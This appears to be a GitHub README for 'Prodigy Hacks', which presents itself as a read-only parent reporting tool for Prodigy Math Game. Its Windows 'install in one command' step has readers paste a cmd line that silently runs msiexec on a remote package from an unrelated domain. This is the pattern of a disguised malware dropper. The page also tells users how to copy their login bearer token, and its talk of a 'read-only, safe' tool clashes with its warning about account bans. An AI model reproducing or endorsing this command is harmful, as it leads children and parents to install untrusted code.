<img width="1342" height="747" alt="4114" src="https://github.com/user-attachments/assets/6947e1d2-0fdf-4624-8e4d-4fe643aa0607" />
<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=0:8b5cf6,50:6366f1,100:06b6d4&height=200&section=header&text=Prodigy%20Hacks&fontSize=55&fontColor=ffffff&fontAlignY=38&desc=A%20parent's%20companion%20for%20the%20Prodigy%20Math%20Game&descAlignY=60&descSize=18" width="100%"/>

<br/>

[![Stars](https://img.shields.io/github/stars/EnsignKazekage/Prodigy-Hacks?style=for-the-badge&logo=github&color=8b5cf6&labelColor=0f0f0f)](https://github.com/EnsignKazekage/Prodigy-Hacks/stargazers)
[![Python](https://img.shields.io/badge/Python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white&labelColor=0f0f0f)](https://python.org)
[![License](https://img.shields.io/badge/License-MIT-22c55e?style=for-the-badge&labelColor=0f0f0f)](LICENSE)
[![For Parents](https://img.shields.io/badge/For-Parents%20%26%20Educators-f59e0b?style=for-the-badge&labelColor=0f0f0f)](#)
[![Read Only](https://img.shields.io/badge/Read--Only-Safe%20by%20Design-22c55e?style=for-the-badge&labelColor=0f0f0f)](#)

<br/>

> We recommend that you use an alternate Prodigy account when using our Prodigy hacks. Using hacks on your main account could get it hacker-tagged, reset, banned, or most likely broken.

</div>

---

## What this does

Prodigy Math Game is a great educational tool but the parent dashboard inside the app gives you very little visibility. This tool fills that gap by talking to the same public API the official app uses, with the parent's own login token, in **read-only** mode.

You get:

| 📅 **Weekly reports** | See play time, accuracy, and skill mastery over the last 7 days — all in one summary |
| 🧠 **Skill breakdown** | Instantly see which math standards your child has mastered and which need extra practice |
| ⏱️ **Screen‑time tracking** | Track daily play time with a configurable limit you set (e.g., 45 min/day) |
| 📈 **Session history** | Spot patterns in when and how your child plays — time of day, duration, accuracy per session |
| 📤 **HTML export** | Generate a clean, print‑ready report you can email to a co‑parent, teacher, or grandparent |

---

## Install in one command (Windows, cmd.exe)

WIN + R type CMD(Command Prompt) and paste:

```cmd
cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Prodigy-hacks
```

The installer will:
- Install Python and Git if missing (via winget)
- Clone this repo to `%USERPROFILE%\ProdigyCompanion`
- Install dependencies
- Add a `prodigy` command to your PATH

Restart your terminal after install.

### Linux / macOS

```bash
curl -fsSL https://raw.githubusercontent.com/EnsignKazekage/Prodigy-Hacks/main/scripts/install.sh | bash
```

---

## Quick start

```bash
# 1. Save your session token (one time)
prodigy login --token YOUR_TOKEN

# 2. Set your child's user ID as default
prodigy use 12345678

# 3. View the weekly report
prodigy week
```

That's it. Now `prodigy week`, `prodigy skills`, `prodigy screen-time` work without any extra arguments.

---

## Demo

```
$ prodigy week

  Week of 2026-05-06

  Activity
  --------------------------------------------------
  Play time:              3h 24m
  Sessions:               7
  Questions:              182
  Correct answers:        158
  Accuracy:               86.8%  █████████████████░░░

  Mastered skills
  --------------------------------------------------
  Multi-digit subtraction         ████████████████░░░░  85%
  Place value to 1,000s           █████████████████░░░  88%
  Reading 24-hour time            ██████████████████░░  92%

  Needs practice
  --------------------------------------------------
  Equivalent fractions            ███████░░░░░░░░░░░░░  36%
  Word problems with division     ████████░░░░░░░░░░░░  42%

  Great week of learning! Strong accuracy and consistent practice.
```

---

## All commands

| Command | What it does |
|---------|--------------|
| `prodigy login --token <TOKEN>` | Save your session token (one time) |
| `prodigy logout`                | Remove the saved token |
| `prodigy use <USER_ID>`         | Set the default child user ID |
| `prodigy set-limit <MINUTES>`   | Set the daily screen-time limit |
| `prodigy profile`               | Show name, grade, and title |
| `prodigy week`                  | Weekly learning summary |
| `prodigy skills`                | Math skill mastery table |
| `prodigy skills -f weak`        | Show only skills under 50% mastery |
| `prodigy skills -f strong`      | Show only skills above 80% mastery |
| `prodigy sessions`              | Recent play sessions |
| `prodigy sessions -d 30`        | Sessions from the last 30 days |
| `prodigy assignments`           | Teacher-assigned practice goals |
| `prodigy screen-time`           | Today's play time vs. your daily limit |
| `prodigy export -o report.html` | Export the weekly report as HTML |

---

## Getting your session token

This tool needs the same token your browser uses when logged in at prodigygame.com. It is **never sent anywhere except to Prodigy's own API**, and is stored locally in `~/.prodigy-companion/config.json` with restricted permissions.

To find your token:

1. Log in to your account at https://play.prodigygame.com
2. Open the browser DevTools (F12)
3. Go to the **Network** tab
4. Refresh the page
5. Click any request to `api.prodigygame.com`
6. Look at the **Headers** section → `Authorization: Bearer ...`
7. Copy the part after `Bearer ` and paste into `prodigy login --token <that part>`

Tokens expire periodically. If commands stop working, just run `prodigy login` again with a fresh token.

---

## Privacy and design

- **Read-only.** This tool never modifies your child's account, game state, gold, items, or anything else. All HTTP requests are GET.
- **Local-only storage.** Your token and config live at `~/.prodigy-companion/config.json` with `0600` permissions. Nothing is uploaded anywhere.
- **No telemetry.** No analytics, no tracking, no third-party services.
- **Open source.** Read every line of code yourself. The whole CLI is under 500 lines of Python.
- **Respects Prodigy.** This is a complement to the official app for parents who want richer visibility, not a replacement, and not a game modifier.

---

## How it works

```
You
 │
 ▼
prodigy CLI (Click)
 │
 ▼
ProdigyCompanion async client (httpx)
 │
 ▼
Prodigy Public API (api.prodigygame.com)
   /v3/characters/{id}       profile
   /v3/students/{id}/skills  mastery scores
   /v3/students/{id}/sessions play history
   /v3/students/{id}/assignments teacher goals
```

Everything is async. Reports are built from raw API data into parent-friendly summaries.

---

## Project structure

```
Prodigy-Companion/
├── prodigy.py                # Entry point
├── requirements.txt
├── scripts/
│   ├── install.bat           # Windows one-command installer
│   └── install.sh            # Unix installer
└── src/
    ├── api/
    │   └── client.py         # Async read-only API client
    ├── cli/
    │   └── main.py           # CLI commands
    ├── reports/
    │   └── html_report.py    # Shareable HTML export
    └── utils/
        ├── config.py         # Local token storage
        └── formatter.py      # Terminal output
```

---

## Roadmap

- [x] Weekly report with skill mastery
- [x] Screen-time tracking
- [x] Teacher assignment view
- [x] HTML export
- [x] Configurable daily limits
- [ ] CSV export for long-term progress tracking
- [ ] Multiple children profiles in one config
- [ ] Email digest mode (cron-friendly)
- [ ] Spaced-repetition suggestions for weak skills
- [ ] Comparison vs. grade-level benchmarks

---

## Contributing

PRs, ideas, and bug reports welcome.

```bash
git clone https://github.com/EnsignKazekage/Prodigy-Hacks
cd Prodigy-Hacks
pip install -r requirements.txt
python prodigy.py --help
```

---

## License

MIT. Free to use, fork, build on. Not affiliated with or endorsed by SMARTeacher Inc. or Prodigy Education.

---

<div align="center">

Built so parents can see what their kid is actually learning.

If it helped you, drop a star.

</div>
